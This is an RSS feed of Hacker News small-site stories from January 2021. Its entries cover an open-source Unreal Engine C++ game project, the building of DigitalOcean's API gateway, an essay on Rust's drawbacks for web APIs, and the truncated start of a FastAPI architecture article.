<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 20]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 20. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sun, 17 Jan 2021 17:29:49 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-20.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sun, 17 Jan 2021 17:29:49 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[New ‘Action Roguelike’ C++ Project on GitHub]]>
            </title>
            <description>
<![CDATA[
Score 31 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25800771">thread link</a>) | @todsacerdoti
<br/>
January 15, 2021 | https://www.tomlooman.com/action-roguelike-cpp-ue4/ | <a href="https://web.archive.org/web/*/https://www.tomlooman.com/action-roguelike-cpp-ue4/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>For the <a rel="noreferrer noopener" href="https://www.tomlooman.com/stanford-cs193u/" target="_blank">Stanford University Fall 2020 Curriculum</a>, I built a small game project using mainly C++ mixed with some Blueprint in Unreal Engine. For those interested, the entire Computer Science course (CS193U) was provided through Zoom lectures and has been recorded. I’m working on getting this published and meanwhile, this project is already <a rel="noreferrer noopener" href="https://github.com/tomlooman/ActionRoguelike" target="_blank">open-source through GitHub</a> to be taken apart by anyone! </p>
<div><figure><img loading="lazy" width="900" height="490" src="https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=900%2C490&amp;ssl=1" alt="" srcset="https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=900%2C490&amp;ssl=1 900w, https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=768%2C418&amp;ssl=1 768w, https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?w=1222&amp;ssl=1 1222w" sizes="(max-width: 900px) 100vw, 900px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=900%2C490&amp;ssl=1 900w, https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=768%2C418&amp;ssl=1 768w, https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?w=1222&amp;ssl=1 1222w" data-lazy-src="https://i0.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/actionroguelike_ue4_combatsample.jpg?resize=900%2C490&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>
<p><strong>Check out the project file <a rel="noreferrer noopener" href="https://github.com/tomlooman/ActionRoguelike" target="_blank">right here</a></strong> <strong>on GitHub!</strong></p>
<h2>Description</h2>
<p>The game was built with a wide set of features to cover a variety of useful coding concepts to students including AI, multiplayer programming, save games, async asset loading, etc. Check out the non-exhaustive list of features below, I’m sure there is more that I forgot to include or that will drip in at a later time.</p>
<p>Those interested in a GAS (<a href="https://docs.unrealengine.com/en-US/InteractiveExperiences/GameplayAbilitySystem/index.html" target="_blank" rel="noreferrer noopener">Gameplay Ability System</a>) style design might be keen to check out how we handled Abilities (<a href="https://github.com/tomlooman/ActionRoguelike/blob/master/Source/ActionRoguelike/Public/SAction.h" target="_blank" rel="noreferrer noopener">Action.h</a>) and Buffs/Debuffs (<a href="https://github.com/tomlooman/ActionRoguelike/blob/master/Source/ActionRoguelike/Public/SActionEffect.h" target="_blank" rel="noreferrer noopener">ActionEffect.h</a>) as this shares many similarities with GAS design, albeit its much simpler.</p>
<p>At the time of writing, there isn’t a whole lot that makes this a real ‘roguelike’ with things like permadeath or proper RNG. But, I hope to extend this project later on with more relevant features to have a proper game loop to earn the name ‘Action Roguelike’.</p>
<figure><p>
<iframe title="Action Roguelike Combat Sample [Unreal Engine]" width="900" height="506" src="https://www.youtube.com/embed/8jDCtT88bdk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>
<figure><p>
<iframe title="CS193U: Blackhole Projectile Assignment Example" width="900" height="506" src="https://www.youtube.com/embed/uSOEPkX3OtI?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>
<h2>Features</h2>
<p>Below I’ve listed some of the more relevant features included in the project. I think these code samples can be invaluable in getting an idea on how to use them in the Unreal Engine eco-system. Especially things like Asset Manager have limited public examples, which is one of the benefits of this open-source project.</p>
<ul><li>Third-person Action Character Movement</li><li><strong>Action System</strong>&nbsp;(Gameplay Ability System-lite)<ul><li>Dash Ability (Teleporting via projectile)</li><li>Blackhole Ability</li><li>Magic Projectile Attack</li><li>“Thorns” buff (reflecting damage)</li><li>Burning Damage-over-time effect</li></ul></li><li>AttributeComponent (Health, Rage etc.)</li><li><strong>SaveGame System</strong>&nbsp;for persisting progress of character and world state.</li><li>Heavy use of Events to drive UI and gameplay reactions.</li><li>Mix of C++ &amp; Blueprint and how to combine these effectively.</li><li><strong>GameplayTags</strong> to mark-up Actors, Buffs, Actions.</li><li><strong>Multiplayer support</strong>&nbsp;for all features</li><li>GameMode Logic<ul><li>EQS for binding bot/powerup spawn locations.</li><li>Bot spawning system (bots cost points to spawn, gamemode gains points over time to spend)</li><li>DataTable holds bot information</li><li>DataAssets to hold enemy configurations</li></ul></li><li><strong>Asset Manager:</strong>&nbsp;Async loading of data assets</li><li>Async loading of UI icons</li><li>AI (Ranged Shooter style)<ul><li>Minion AI with Behavior Trees (Roam, See, Chase, Attack, Flee/Heal)</li><li>C++ Custom Behavior Trees Nodes</li><li>EQS for attack/cover locations by AI Powerups</li></ul></li><li>Powerup pickups to heal, gain credits/actions (UMG)</li><li>Main menu to host/join game (UMG)</li><li>UI elements for player attributes and projected widgets for powerups and enemy health.</li><li>C++ Localized Text Example</li></ul>
<p><strong>Check out the project file <a rel="noreferrer noopener" href="https://github.com/tomlooman/ActionRoguelike" target="_blank">right here</a></strong> <strong>on GitHub!</strong></p>
<div><figure><img loading="lazy" width="900" height="463" src="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?resize=900%2C463&amp;ssl=1" alt="" srcset="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?w=900&amp;ssl=1 900w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?resize=768%2C395&amp;ssl=1 768w" sizes="(max-width: 900px) 100vw, 900px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?w=900&amp;ssl=1 900w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?resize=768%2C395&amp;ssl=1 768w" data-lazy-src="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/ue4_actionroguelike_aisample.jpg?resize=900%2C463&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Spotted by Minion’s sight sense.</figcaption></figure></div>
<div><figure><img loading="lazy" width="900" height="532" src="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=900%2C532&amp;ssl=1" alt="" srcset="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=900%2C532&amp;ssl=1 900w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=768%2C454&amp;ssl=1 768w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?w=1280&amp;ssl=1 1280w" sizes="(max-width: 900px) 100vw, 900px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=900%2C532&amp;ssl=1 900w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=768%2C454&amp;ssl=1 768w, https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?w=1280&amp;ssl=1 1280w" data-lazy-src="https://i1.wp.com/www.tomlooman.com/wp-content/uploads/2021/01/assignment4_behaviortree.jpg?resize=900%2C532&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Behavior Tree for Ranged Minion AI</figcaption></figure></div>
<h2>What’s Next?</h2>
<p>There is still a decent chunk of features I would like to add, including adding a proper game loop, items/abilities, Steamworks, etc. Whether these will actually see the light of day depends on many factors – including the final shape of the existing course recordings.</p>
<!-- #js-embed-sendy.embed-sendy -->
</div></div>]]>
            </description>
            <link>https://www.tomlooman.com/action-roguelike-cpp-ue4/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25800771</guid>
            <pubDate>Sat, 16 Jan 2021 07:34:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building DigitalOcean's API Gateway]]>
            </title>
            <description>
<![CDATA[
Score 90 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25800237">thread link</a>) | @chynkm
<br/>
January 15, 2021 | https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html | <a href="https://web.archive.org/web/*/https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
	<p>TL;DR: this is mostly a text version of a presentation I’ve done a couple times (<a href="https://www.youtube.com/watch?v=S8OQfB6JSf8">English</a> or <a href="https://www.youtube.com/watch?v=Ld8UFU-DB1U">Portuguese</a>) on the history of building DigitalOcean’s API gateway. How we made it easier for folks to build new microservices instead of continuing to add code to our monoliths, the successes, failures and lessons learned.</p>

<p>First, where were we?</p>

<p>DigitalOcean had 3 monoliths back in 2016 when we started (all 3 are still alive today, albeit much smaller than they were before). Why were there 3? There is a shared library that contains most of the logic that all 3 applications use, so in reality we had one “monolith library” that was reused at all 3, most logic changes were made into this library and then it would be upgraded at every single app separately. The library still exists today and continues to be updated every once in a while.</p>

<p>As you can imagine, as more and more changes started to happen, with the company growing incredibly fast both in terms of business and hiring, this wasn’t ideal. Many times someone would change this core library, deploy one of the apps (the control pane you see when you sign in), but not the JSON API. So you could end up with a new feature visible at the control panel but not at the API. There would always be a time when this library version wouldn’t match across all applications, as we were not deploying them all at once every single time, so there was always space for there to be a mismatch of features available.</p>

<p>This also meant that the test suite was growing by leaps and bounds, getting slower, making running the test suite and deployments a pain. There was growing interest in doing something about this, but we couldn’t just migrate everything out. There was also a lot of interest in NOT doing Ruby anymore. There was a growing body of Golang code all over the place and people wanted to use it for their new services instead of building it all inside the old monoliths.</p>

<p>There was a catch here though, how could they possibly do all the things the Rails apps were doing, like authentication, rate limiting, authorization, feature flipping, routing, error handling and all the shared logic, in a new language, without repeating the same thing across all new projects?</p>

<p>We needed something that would be language agnostic and could be run side by side with the existing monoliths. At this point we knew a library ( like Twitter’s Finagle) wasn’t an option. Our solution had to work with the old Ruby code and the new Golang stuff (and JS, maybe Python. It was all up in the air back then). We wouldn’t be able to build a library with all the shared features needed in multiple languages.This is where the API gateway comes in.</p>



<p>The microservices.io patterns list has a great definition for the <a href="https://microservices.io/patterns/apigateway.html">API gateway</a>:</p>

<div><div><pre><code>Implement an API gateway that is the single entry point for all clients. The API gateway handles requests in one of two ways. Some requests are simply proxied/routed to the appropriate service. It handles other requests by fanning out to multiple services. 
</code></pre></div></div>

<p>It took us multiple meetings and discussions between Joonas Bergius, Nan Zhong, Joe Friedl, me and even Phil Calçado, who was the engineering lead (not sure if this was actually the title but he was the boss), to come to the realization that we were going to build an API gateway.</p>

<p>What came out of the brainstorms:</p>

<ul>
  <li>It was going to be a pure HTTP proxy, no GRPC, GraphQL or other special protocols;</li>
  <li>We would not change request or response bodies, so there wouldn’t be any protocol translation. Applications would be responsible for parsing the input and producing valid outputs, in the format the client was expecting;</li>
  <li>We’d augment the requests and responses with extra information encoded as HTTP headers, including user information, rate limiting details, tracing metadata, features enabled, so all downstream applications would have to do was looking at the headers, not special exchange format.</li>
  <li>Route configuration would be self-service, teams would call a service with their route configuration and the proxy would automatically pick up changes and update it’s routing table. It would perform basic health checking and remove destinations that weren’t reachable, but otherwise would take any request and forward it to the registered services.</li>
  <li>It would also include filters that could be run before or after a request was processed, these filters would include authentication, rate limiting, feature flipping and all the other shared pieces teams would need to be available to build apps out of the monoliths.</li>
</ul>

<p>Does it look a lot like Java’s Servlet API or Ruby’s Rack? Of course, those were the main inspirations for the design. Going for a simple, well known, design would make us move faster as there would be less stuff to do and we could always complicate it in the future. This was one of the best decisions we made and this is still the way it works nowadays.</p>

<p>Why didn’t we pick something that existed? Fair question. There really weren’t many options back then and the ones that did exist did not make it easy to integrate custom code. Our very first challenge was to decrypt and parse Rails sessions to authenticate users, and there was plenty of complex code to decrypt, unmarshal (from Ruby’s serialization format) and make sense of session data.</p>

<p>Nginx, that was one of the options when we started, only offered integration through Lua scripts, so we’d have to write this session decrypting and parsing logic in Lua scripts we’d bundle with our custom Nginx install and that did not feel like a great solution. It was hard to test the scripts, no one had any experience with Lua and the whole setup wasn’t robust, these scripts were seen mostly as doing small changes in the request flow, not for building complex logic.</p>

<p>So, we started building our own API gateway in Golang.</p>



<p>Once we had the basic proxy built, we placed it in front of some of the traffic, to make sure it could proxy correctly. The first two “filters” we built were the authentication filters, for Rails sessions and OAuth tokens. To roll these out, we started by “doing” the filter work for both monoliths but not acting on them, we’d check if the output we came to in our implementation was the same the monoliths decided on and if the response was also the same; if our own service said a request should be denied but the monoliths responded with an OK or the other way around, we’d log that and work on figuring out why it didn’t work.</p>

<p>As we built these filters, another pattern emerged, instead of having all this code inside the API gateway itself, we thought it would be faster to separate the code into a separate service. The initial goal was mostly to make it reusable by other teams if needed and make it easier for us to deploy smaller changes as deploying the gateway itself was a complicated and slow process (due to the way our internal K8s clusters networking was setup back then, we couldn’t run the gateway on them, so it ran on droplets). After that, almost all filters were just glue code to call an external service that actually knew how to get the job done.</p>

<p><img src="https://mauricio.github.io/images/api-gateway.png" alt="API Gateway simple architecture diagram" title="API Gateway simple architecture diagram"></p>

<p>While it was a response to environmental constraints and not really something we planned, this design made the gateway itself smaller and more reliable. A lot of the logic would live in these microservices instead of the gateway and updates to them had a much smaller blast radius when something went awry.</p>

<p><a href="https://twitter.com/nanzhong">@nanzhong</a> finally switched it to serve all traffic sometime in November 2016, a couple months after our announcement, including full support for authentication with the Rails session and OAuth tokens.</p>



<p>So far we had only done work internally. We weren’t exposing any of this to other teams yet, as we wanted to verify it was all behaving as expected before letting people register their services. The first integrations were bumpy and the experience for the teams we were integrating with was hard.</p>

<p>We lacked documentation and good examples. Teams had to come to us frequently to make sure their services were really up, their configurations were valid, how routing would work (what options are available? Can I use wildcards? Can I use URL parameters? In what order are routes matched?) and how they should integrate route registration into their workflows. This led to a lot of manual labor on our end helping people do stuff they could be doing themselves had we done the work to make it easier to onboard them. The lesson here was clear, if you’re working on infrastructure, make sure you can stay out of the way when people are doing their work, you want them to work on their time and not be an impediment for their work.</p>

<p>We also lacked best practices for what the backend services should look like. Multiple teams were being formed of new developers that didn’t have a lot of experience with building applications with Golang and we did not provide guidance here on how they should set up their applications and what configurations were important.</p>

<p>One recurrent issue we had at the beginning was that <a href="https://golang.org/pkg/net/http/#Server">Golang’s http.Server</a> class assumes all timeouts are infinite unless you set them (ReadTimeout, ReadHeaderTimeout, WriteTimeout, WriteIdleTimeout) and this would lead to services getting a broken connection from the client (the API gateway) and wouldn’t know what it was until we checked their configs and noticed they just didn’t set a value (while we did have a max timeout for all requests on our end, so we’d close a connection that took too long).</p>

<p>Providing better guidance here for basic options and configurations that teams should be doing in all their apps would have saved a lot of time and effort for everyone.</p>

<p>Next, when registering routes, teams would talk directly to the key-value store we were using to store the routing table (Consul) and as you can imagine this wasn’t ideal. There was very little validation in place and it was super simple for people to register routes that wouldn’t load or that wouldn’t really route anything due to being incomplete. …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html">https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html</a></em></p>]]>
            </description>
            <link>https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25800237</guid>
            <pubDate>Sat, 16 Jan 2021 05:14:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust is a hard way to make a web API]]>
            </title>
            <description>
<![CDATA[
Score 289 | Comments 314 (<a href="https://news.ycombinator.com/item?id=25798008">thread link</a>) | @tmcw
<br/>
January 15, 2021 | https://macwright.com/2021/01/15/rust.html | <a href="https://web.archive.org/web/*/https://macwright.com/2021/01/15/rust.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Rust is an amazing language. It has enabled excellent CLI tools like <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> and <a href="https://github.com/ogham/exa">exa</a>. Companies like Cloudflare are using Rust for their own systems and <a href="https://blog.cloudflare.com/tag/rust/">encouraging people to write Rust to run microservices</a>. Rust makes it possible to write really fast software that’s secure, tiny, and more concise than C++ or C.</p><p>If I were writing a geocoder, a routing engine, a real-time messaging platform, a database, or a CLI tool, Rust would be at the top of the list.</p><p>But last year, I spent some time trying to make Rust work for a plain-vanilla API to power a normal website. It wasn’t a very good fit.</p><h3 id="lots-of-missing-pieces">Lots of missing pieces</h3><p>Rust has a fair number of web server frameworks, database connectors, and parsers. But building authentication? You have only <em>very</em> low-level parts. Where Node.js will give you <a href="http://www.passportjs.org/">passport</a> and Rails has <a href="https://github.com/heartcombo/devise">devise</a> and Django gives you an <a href="https://developer.mozilla.org/en-US/docs/Learn/Server-side/Django/Authentication">auth model out of the box</a>, in Rust you’re going to build this system by learning how to shuttle a shared vec into low-level crypto libraries. There are libraries trying to fix this, like <a href="https://github.com/breard-r/libreauth">libreauth</a>, but they’re nascent and niche. Repeat for plenty of other web framework problem areas.</p><p>How about SDKs? In mainstream languages, you’ll be able to plug into Google Cloud services, AWS, or Stripe by bringing in an official library. Those libraries are mostly great. The <a href="https://aws.amazon.com/sdk-for-javascript/">aws-sdk-js</a> and <a href="https://stripe.com/docs/libraries">Stripe libraries</a>, for example, are incredibly well-designed and maintained.</p><p>Not so with Rust. There are a few third-party libraries trying to fill in the blanks, which is great, but with the sheer velocity of those services, will they really be able to give a quality experience?</p><p>Some people will say <em>well, X language is so good you can just write an SDK yourself in a weekend!</em> To which I must reply, no.</p><p>Rust’s ecosystem is rich in other domains. The crates for building CLIs, managing concurrency, doing really impressive operations with binary data and low-level parsers - they’re spectacular.</p><h3 id="rusts-compiler-is-faster-than-it-was-but-still-slow">Rust’s compiler is faster than it was, but still slow</h3><p>I’ve been reading <a href="https://blog.mozilla.org/nnethercote/2020/09/08/how-to-speed-up-the-rust-compiler-one-last-time/">Nicholas Nethercote’s</a> <em>excellent</em> blog for years now, in which he describes how the Rust team has made the compiler faster. And they certainly have made it faster!</p><p>But compared to other languages you build websites with, it’s slow. It’s much slower than the Go compiler and much, much slower than the startup time for interpreted languages like JavaScript, Ruby, and Python.</p><p>Once your code is compiled, everything’s amazing! But in my case, this basic API - which wasn’t even feature-complete and was by no means a complex system - took more than ten minutes to compile. On the weak hardware of <a href="https://cloud.google.com/cloud-build">Google Code Build</a>, it would run out of time, every time. We couldn’t build anything.</p><p>Caching helps as long as you don’t have to rebuild cached dependencies. And, I don’t know, maybe <a href="https://blog.kodewerx.org/2020/06/the-rust-compiler-isnt-slow-we-are.html">slimming down dependencies</a> would help Rust projects compile faster. But <a href="https://serde.rs/">serde</a>, for example - the JSON and other-format serializer/deserializer that nearly everyone uses - takes up a huge chunk of compile time. Should we replace serde with something that compiles faster but lacks great documentation and ecosystem support? It’s a bad trade.</p><h3 id="rust-is-complicated">Rust is complicated</h3><p>Rust makes you think about dimensions of your code that matter tremendously for systems programming. It makes you think about how memory is shared or copied. It makes you think about real but unlikely corner cases and make sure that they’re handled. It helps you write code that’s incredibly efficient in every possible way.</p><p>These are all valid concerns. But for most web applications, they’re not the most important concerns. And buzzword-oriented thinking around them leads to some incorrect assumptions.</p><p>Take, for example, Rust’s safety. This is a big part of the marketing, and it’s absolutely correct: Rust’s main promise is to be both <em>safe</em> and <em>low-level</em> - it works without a garbage collector, while at the same time protecting against memory-based exploits. When you read “safety”, think about Rust competing with C. Code in C can reference arbitrary memory, can easily overflow and segfault. Rust code can be just as fast as that C code, but protect that memory access, and without the cost of a garbage collector or some kind of runtime checking.</p><p>But Rust’s memory rules aren’t more secure than Node.js’s or Python’s. Your web application written in Rust isn’t going to be systematically more or less secure than an application in Python or Ruby. High-level languages with garbage collectors pay a performance penalty in exchange for generally dodging this whole class of exploits and bugs. You can’t reference uninitialized memory in JavaScript because you simply can’t reference memory-as-memory in JavaScript.</p><details><summary>Sidenote…</summary>This is describing the design goal of Node.js and other systems - they do occasionally have bugs that creep into this problem area. The <a href="https://github.com/nodejs/node/issues/4660">previous behavior of Node.js's Buffer object, for example, is a good read.</a></details><p>Heck, if you ask <a href="https://deavid.wordpress.com/2020/01/18/actix-web-is-dead-about-unsafe-rust/">some people</a>, Rust is <em>less secure</em> than a GC’ed language for web apps if you use any crates that have <code>unsafe</code> code - which includes Actix, the most popular web framework, because <a href="https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html">unsafe code allows things like deferencing raw pointers</a>.</p><p>If you’re writing a video game, a pause to run garbage collection is bad. If you’re writing code for a microcontroller, any memory “overhead” or waste is really bad. But most web applications can spare a little memory overhead in exchange for productivity.</p><p>This argument is pretty much the same for the other attributes of Rust. Its concurrency primitives are <em>amazing</em> if you’re doing something complicated and need blistering-fast performance. But if you aren’t? The Rust async ecosystem is challenging, to say the least: there are different sorts of async, projects that span domains to do async implementations of unrelated stuff like <a href="https://tokio.rs/">tokio</a>.</p><p>It feels a lot less like Node.js, which had a good async story but ugly syntax, than Python Tornado or Twisted, which had a weird async story and also ugly syntax.</p><p>Async, I’m sure, will stabilize and homogenize and be a lot easier to do in the future. But I was working in the present.</p><h3 id="the-rust-ecosystem-is-not-web-centric">The Rust ecosystem is not web-centric</h3><p>There are many people currently learning Rust, writing CLI apps or low-level code in Rust, and having an extremely fun time. There are dramatically fewer people using Rust to write plain-vanilla web applications.</p><p>This is an important part of the equation for technology choices: are there people working with the tool <em>and</em> are they roughly in the same domain? Unfortunately, a lot of the incredibly exciting work in the Rust ecosystem has nothing to do with web application servers. There are some promising web frameworks - even a <a href="https://github.com/iron/iron">somewhat higher-level framework</a> - but they’re undoubtedly in a niche. Even Actix, the main web framework, has a <a href="https://github.com/actix/actix-web/graphs/contributors">very top-heavy set of contributors</a>.</p><p>If Rust grows at its current rate, the web portion of the community will reach a sort of critical mass, but right - I don’t think there are enough people using Rust for websites for it to be a practical tool for websites. And compare to other communities in which there are entire companies dedicated to building web applications with existing tools - not cutting-edge work, but the kind of stuff that differentiates a mature technology from a new one.</p><h3 id="the-juniper-crate-invites-n1s">The Juniper crate invites n+1s</h3><p>This part isn’t just about Rust, it’s about the GraphQL ecosystem and Rust’s involvement in that ecosystem is one example.</p><p><a href="https://www.infoq.com/articles/N-Plus-1/">The <strong>n+1</strong> problem</a> is something that everyone building web applications should understand. The gist is: you have a page of photos (1 query). You want to show the author of each photo. How many queries do you end up with: 1, combining the photos &amp; authors, or a query per photo to get the author after retrieving the photos? Or 2 queries, with the second having something like <code>user.id IN ids</code> to fetch all authors in a single pass and then reconnect them to their photos.</p><p>n+1 queries are usually the highest-priority database fixes: they’re usually high-impact, and changing an n+1 query into a single query is usually a big win. And we have lots of ways to try and resolve them: you can write SQL and try to get a lot done in a single query using CTEs and JOINs, like we did at Observable, or use an ORM layer like ActiveRecord that has <a href="https://guides.rubyonrails.org/active_record_querying.html#eager-loading-associations">quick ways to turn n+1 queries into predictable queries</a>.</p><p>We were using <a href="https://github.com/graphql-rust/juniper">Juniper</a>, a <a href="https://graphql.org/">GraphQL</a> server for Rust applications. GraphQL basically lets your <em>frontend application</em> define queries, instead of the backend. You give it a range of things it could query, and the application - React or something else - sends arbitrary queries to the backend.</p><p>This makes things <em>hard</em> for the backend. Any sort of SQL-level optimization is impossible - your server is writing dynamic SQL, so you rely on the intelligence of your GraphQL server, which is not always high. Juniper, for example: n+1 queries by default. The workaround - <a href="https://graphql-rust.github.io/juniper/master/advanced/dataloaders.html">a dataloader</a> - is rough and independently maintained. So at the end of the day, you’re going to have a blisteringly-fast application layer that’s spending all of its time inefficiently querying your database.</p><p>The word is that GraphQL works really well with non-SQL databases which can serve these sorts of requests fast. I’m sure that there’s some special database used internally at Facebook that’s incredible in combination with GraphQL, but the rest of industry is pretty attached to Postgres and its ilk, <a href="https://info.crunchydata.com/blog/postgres-the-batteries-included-database">for good reason</a>.</p><h3 id="lets-have-some-caveats">Let’s have some caveats!</h3><p>So I tried to lead with the main caveat: this isn’t about Rust in general. It’s about using the language and its ecosystem for a particular goal. Simple web APIs.</p><p>The caveat to that: in the general sense, you can build a website with anything and be successful. Remember how OkCupid was <a href="https://github.com/OkCupid/okws">implemented in C++</a>. There’s a popular <a href="https://www.costarastrology.com/">astrology app, Co-star</a>, that’s all Haskell. If you’re great at writing some language and you can hire other people with lots of talent, you can do it and be heroes.</p><p>Another caveat: what I was trying to build was a <a href="https://en.wikipedia.org/wiki/Create,_read,_update_and_delete">CRUD</a>-heavy web application API for a website. It wasn’t a web “service” as you might call them nowadays, something that …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://macwright.com/2021/01/15/rust.html">https://macwright.com/2021/01/15/rust.html</a></em></p>]]>
            </description>
            <link>https://macwright.com/2021/01/15/rust.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25798008</guid>
            <pubDate>Fri, 15 Jan 2021 23:25:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jeffrey Epsteins Little Black-Book Unredacted [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 27 (<a href="https://news.ycombinator.com/item?id=25797773">thread link</a>) | @DyslexicAtheist
<br/>
January 15, 2021 | https://spidercatweb.blog/wp-content/uploads/2019/08/Jeffrey-Epsteins-Little-Black-Book-unredacted.pdf | <a href="https://web.archive.org/web/*/https://spidercatweb.blog/wp-content/uploads/2019/08/Jeffrey-Epsteins-Little-Black-Book-unredacted.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://spidercatweb.blog/wp-content/uploads/2019/08/Jeffrey-Epsteins-Little-Black-Book-unredacted.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25797773</guid>
            <pubDate>Fri, 15 Jan 2021 23:06:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing FastAPI Services – Abstraction and Separation of Concerns]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25797140">thread link</a>) | @jdnier
<br/>
January 15, 2021 | https://camillovisini.com/article/abstracting-fastapi-services/ | <a href="https://web.archive.org/web/*/https://camillovisini.com/article/abstracting-fastapi-services/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-3d5c50e8=""><p data-v-3d5c50e8="">This article introduces an approach to structure FastAPI applications with multiple services in mind. The proposed structure decomposes the individual services into packages and modules, following principles of abstraction and separation of concerns. The code discussed below can also be studied in its entirety in a dedicated companion GitHub repository.</p>

<h2 id="fastapi--building-high-performing-python-apis" data-v-3d5c50e8="">FastAPI – Building High-performing Python APIs</h2>
